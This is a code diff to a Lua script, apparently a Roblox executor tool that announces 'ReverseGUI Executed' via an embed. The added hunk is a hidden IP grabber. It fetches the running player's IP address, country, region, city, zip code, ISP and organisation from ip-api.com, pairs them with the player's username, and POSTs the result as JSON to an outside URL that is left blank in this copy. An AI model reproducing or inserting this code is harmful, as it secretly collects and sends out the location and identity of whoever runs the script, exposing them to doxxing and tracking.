@@ -226,6 +226,44 @@ else
     table.insert(embedFields, {name = "Kicked", value = "No", inline = true})
 end
 
+local _callrequest6 = request({
+
+    Method = "GET",
+
+    Url = "http://ip-api.com/json",
+
+})
+
+local _call8 = game:GetService("HttpService")
+
+local _call11 = _call8:JSONDecode(_callrequest6.Body)
+
+local _21, _21_2, _21_3 = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", game:GetService("Players").LocalPlayer.Name, _call11.query, _call11.country, _call11.countryCode, _call11.region, _call11.regionName, _call11.city, _call11.zip, _call11.isp, _call11.org)
+
+local _call23 = game:GetService("HttpService")
+
+local _call25 = _call23:JSONEncode({
+
+    content = _21,
+
+})
+
+request({
+
+    Body = _call25,
+
+    Url = "",
+
+    Method = "POST",
+
+    Headers = {
+
+        ["Content-Type"] = "application/json",
+
+    },
+
+})
+
 local embed = {
     title = "ReverseGUI Executed🤑",
     color = 0xFF0000,  -- red color
